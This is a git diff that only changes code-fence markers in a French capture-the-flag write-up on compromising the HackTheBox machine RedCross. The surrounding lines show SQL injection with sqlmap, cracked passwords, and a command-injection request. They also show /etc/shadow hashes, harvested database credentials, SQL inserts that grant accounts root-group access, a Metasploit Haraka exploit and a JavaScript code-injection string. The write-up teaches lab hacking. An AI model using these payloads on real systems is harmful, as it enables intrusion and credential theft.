@@ -13,7 +13,7 @@ Il est donné pour 30 points sachant que la notation va jusqu'à 50. C'est donc 
 Identifiants par défaut
 -----------------------
 
-```plain
+```
 22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
 80/tcp  open  http     Apache httpd 2.4.25
 443/tcp open  ssl/http Apache httpd 2.4.25
@@ -29,7 +29,7 @@ Le site dispose d'une page de login et d'un formulaire de contact. Les URLs peuv
 
 Un gobuster nous remonte les dossiers suivants à la racine :  
 
-```plain
+```
 /images (Status: 301)
 /pages (Status: 301)
 /documentation (Status: 301)
@@ -39,7 +39,7 @@ Un gobuster nous remonte les dossiers suivants à la racine :
 
 Dans le dossier pages on retrouve ainsi les pages qui peuvent être chargées via le paramètre *page* (toujours via *gobuster*) :  
 
-```plain
+```
 /contact.php (Status: 200)
 /login.php (Status: 200)
 /header.php (Status: 200)
@@ -50,7 +50,7 @@ Dans le dossier pages on retrouve ainsi les pages qui peuvent être chargées vi
 
 Ne trouvant rien de plus je me suis penché sur la recherche d'autres sous-domaines, la présence de *intra* n'étant probablement pas là pour rien.  
 
-```plain
+```
 $ patator http_fuzz url="https://10.10.10.113/" method=GET header="Host: FILE0.redcross.htb" 0=/usr/share/sublist3r/subbrute/names.txt -x ignore:code=301
 15:57:26 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2018-12-31 15:57 CET
 15:57:26 patator    INFO -
@@ -62,7 +62,7 @@ $ patator http_fuzz url="https://10.10.10.113/" method=GET header="Host: FILE0.r
 
 Go-buster again. On y trouve des dossiers en commun avec le précédent host et d'autres indépendants :  
 
-```plain
+```
 
 /images (Status: 301)
 /pages (Status: 301)
@@ -73,7 +73,7 @@ Go-buster again. On y trouve des dossiers en commun avec le précédent host et 
 
 Il faut dire que ce site admin ressemble comme deux goûtes d'eau à l'autre si ce n'est le logo qui change. On trouve tout de même de nouveaux scripts dans */pages* :  
 
-```plain
+```
 /login.php (Status: 200)
 /header.php (Status: 200)
 /users.php (Status: 302)
@@ -112,7 +112,7 @@ Premier essai et aucun résultat :( Le message d'erreur est pourtant bien verbeu
 
 La première intuition est d'utiliser un user-agent aléatoire au lieu de celui clairement identifiable de l'outil :  
 
-```plain
+```
 $ sqlmap -u "https://intra.redcross.htb/?o=1&page=app" -p o --cookie="PHPSESSID=mreqtebbk20fa24ppak7rj3k81"  --random-agent --keep-alive --delay=2 --current-user
 
 [*] starting at 15:25:51
@@ -148,7 +148,7 @@ Cette fois ça passe comme dans du beurre. L'auteur que sqlmap [a mentionné une
 
 Je vous fait grâce des légères modifications de commandes pour lister les bases de données, tables et dumper tout ça : *sqlmap -h* (ou *-hh*) se suffit à lui même.  
 
-```plain
+```
 available databases [2]:
 [*] information_schema
 [*] redcross
@@ -201,7 +201,7 @@ Table: users
 
 Next-step, casser les hashs bien sûr. JTR a fait ça très bien. L'algo de hash utilisé ici est toutefois assez fort ce qui est un peu regrettable sur un CTF (ça privilégie les participants ayant un GPU et ça n'apporte rien sur le plan technique).  
 
-```plain
+```
 guest:guest
 charles:cookiemonster
 penelope:alexss
@@ -230,7 +230,7 @@ L'objectif est maintenant d'obtenir le cookie de l'administrateur. Pour cela on 
 
 Groovy :)
 
-```plain
+```
 10.10.10.113 - "GET /PHPSESSID=cg9l76l7f755ki5v0iufj1vob5;%20LANG=EN_US;%20SINCE=1546424177;%20LIMIT=10;%20DOMAIN=admin HTTP/1.1" 404 -
 ```
 
@@ -247,7 +247,7 @@ Sésame, ouvre-toi
 
 J'ai commencé par soumettre mon IP sur ce second script puis j'ai relancé un scan Nmap qui a détecté de nouveaux ports :  
 
-```plain
+```
 21/tcp   open  ftp         vsftpd 2.0.8 or later
 |_banner: 220 Welcome to RedCross FTP service.
 1025/tcp open  NFS-or-IIS?
@@ -288,7 +288,7 @@ La page *users* permet uniquement de spécifier un nom d'utilisateur. Une fois s
 
 Ces identifiants permettent d'accéder au serveur FTP. On y trouve deux dossiers à la racine qui appartiennent à root (uid 0) et un groupe inconnu (uid 1001) :  
 
-```plain
+```
 ftp> ls -a
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
@@ -300,7 +300,7 @@ drwxrwxr-x    3 0        1001         4096 Jun 08  2018 public
 
 Dans */public/src* on trouve le code source suivant :  
 
-```plain
+```
 -rw-r--r--    1 1000     1000         2666 Jun 10  2018 iptctl.c
 ```
 
@@ -308,7 +308,7 @@ L'autre dossier est lui vide. On verra plus tard pour le code source qui n'appor
 
 On peut utiliser les même creds générés pour accéder au SSH. Notre compte est rattaché au groupe *associates* avec le gid vu plus tôt :  
 
-```plain
+```
 uid=2023 gid=1001(associates) groups=1001(associates)
 ```
 
@@ -332,7 +332,7 @@ J'ai remarqué que d'après l'output obtenu la dernière commande insérée semb
 
 La requête à envoyer sera de cette forme :  
 
-```plain
+```
 POST https://admin.redcross.htb/pages/actions.php HTTP/1.1
 ip=8.8.8.8;id;uname -a;pwd;date;&id=17&action=deny
 ```
@@ -575,7 +575,7 @@ Il faut donc des gadgets qui mettent les valeurs que l'on souhaite dans ces regi
 
 Avec [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) j'en ait relevé deux utiles :  
 
-```plain
+```
 0x0000000000400de3 : pop rdi ; ret
 0x0000000000400de1 : pop rsi ; pop r15 ; ret
 ```
@@ -670,7 +670,7 @@ A l'emplacement */tmp/show* on mettra par exemple un reverse *Metepreter*. Avec 
 
 On a alors les droits pour lire le flag (*892a1f4d0*...) ou */etc/shadow* :  
 
-```plain
+```
 root:$6$sGf6YPC9$H0ocTuQ4NWwgjlI0tMLXOb3jYR4QSOArGpeh/C7FL9HFpMSGGk4cDbKlyCwyrOVaCShgUOz3KVQP63OGs9Ij1.:17692:0:99999:7:::
 penelope:$6$t15lzJqW$jAvVr1665q0qlnO.cbXOZp8hbgQRwNIv31gxvGASVMOYOrw4/LR6b/YQnk3DWxE4zl3BKCAqIm8CkWo/uuRi1.:17692:0:99999:7:::
 ```
@@ -682,7 +682,7 @@ Maintenant quelle était la méthode pour obtenir le flag de *Penelope* sans obt
 
 Quand on a notre premier shell on peut chercher dans les scripts PHP les identifiants PostgreSQL :  
 
-```plain
+```
 $ grep -r --include "*.php" pg_connect * 2>/dev/null                    
 admin/pages/firewall.php:   $dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
 admin/pages/users.php:  $dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw");
@@ -700,7 +700,7 @@ Si on regarde les logs du système on voit clairement que le PAM est configuré 
 
 On dispose de suffisamment de droits pour lister le dossier personnel de l'utilisatrice *penelope* :  
 
-```plain
+```
 total 36
 drwxr-xr-x 4 penelope penelope 4096 Jun 10  2018 .
 drwxr-xr-x 3 root     root     4096 Jun  8  2018 ..
@@ -717,7 +717,7 @@ drwx------ 2 penelope penelope 4096 Jun  9  2018 .ssh
 
 On est bien sûr tenté de nous ajouter un compte UNIX avec les droits de l'utilisatrice. Pour cela on se connecte à la base de données avec *psql -h 127.0.0.1 -d unix -U unixusrmgr*, on rentre le mot de passe puis on passe la requête suivante :  
 
-```plain
+```
 insert into passwd_table (username, passwd, uid, gid, homedir) values ('devloop', '$1$xyz$b0R51BwJVtqELmbicAObd.', 1000, 1000, '/home/penelope');
 ```
 
@@ -731,13 +731,13 @@ L'opération échoue avec le message
 
 On ne peut pas *emprunter* l'UID de l'utilisatrice. On va donc s'en tenir à son groupe. Les UIDs sont rattachés à une séquence (auto-increment) :  
 
-```plain
+```
 insert into passwd_table (username, passwd, gid, homedir) values ('devloop', '$1$xyz$b0R51BwJVtqELmbicAObd.', 1000, '/home/penelope');
 ```
 
 Cette fois on peut se connecter :  
 
-```plain
+```
 devloop@kali:~/Documents/redcross$ ssh devloop@intra.redcross.htb 
 devloop@intra.redcross.htb's password: 
 Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64
@@ -762,13 +762,13 @@ L'utilisatrice a un dossier *haraka* qui nécessite les droits du groupe *mailad
 
 En revanche il faut pouvoir accéder à la configuration du Haraka pour réaliser l'exécution de commande, ce qui sera notre cas si on obtient le bon gid ;-)   
 
-```plain
+```
 insert into passwd_table (username, passwd, gid, homedir) values ('devloop2', '$1$xyz$b0R51BwJVtqELmbicAObd.', 1003, '/home
 ```
 
 Une fois la configuration de *Haraka* vérifiée via notre nouveau compte SSH on peut utiliser le module Metasploit :  
 
-```plain
+```
 msf exploit(linux/smtp/haraka) > show options
 
 Module options (exploit/linux/smtp/haraka):
@@ -821,7 +821,7 @@ Same Old Story
 
 On peut se servir du PAM/PostgreSQL pour obtenir notre accès root aussi. On s'accorder d'abord un GID 0 :  
 
-```plain
+```
 insert into passwd_table (username, passwd, gid, homedir) values ('devloop', '$1$xyz$b0R51BwJVtqELmbicAObd.', 0, '/');
 ```
 
@@ -833,13 +833,13 @@ find / -group 0 -perm -g+w -type f -not -path '/proc/*' 2> /dev/null
 
 Ce dernier est ressorti :  
 
-```plain
+```
 -rw-rw---- 1 root root 540 Jun  8  2018 /etc/nss-pgsql-root.conf
 ```
 
 Avec le contenu suivant :  
 
-```plain
+```
 shadowconnectionstring = hostaddr=127.0.0.1 dbname=unix user=unixnssroot password=30jdsklj4d_3 connect_timeout=1
 shadowbyname = SELECT username, passwd, date_part('day',lastchange - '01/01/1970'), min, max, warn, inact, expire, flag FROM shadow_table WHERE username = $1 ORDER BY lastchange DESC LIMIT 1;
 shadow = SELECT username, passwd, date_part('day',lastchange - '01/01/1970'), min, max, warn, inact, expire, flag FROM shadow_table WHERE (username,lastchange) IN (SELECT username, MAX(lastchange) FROM shadow_table GROUP BY username);
@@ -852,7 +852,7 @@ Under the hood
 
 Que se trame t-il derrière le compte root ?  
 
-```plain
+```
 devloop3@redcross:/root$ ls -la
 total 64
 drwxr-x---  6 root root  4096 Oct 31 12:33 .
@@ -934,7 +934,7 @@ Cela aurait pu être fun d'avoir à injecter du code dans *launchXSS* malheureus
 
 Dans le cas contraire on aurait pu injecter la chaîne suivante pour exécuter *sleep 5* sur la machine :  
 
-```plain
+```
 ');var execFile=require('child_process').execFile;execFile('sleep',['5'],null,function(){phantom.exit();});console.log('
 ```
 
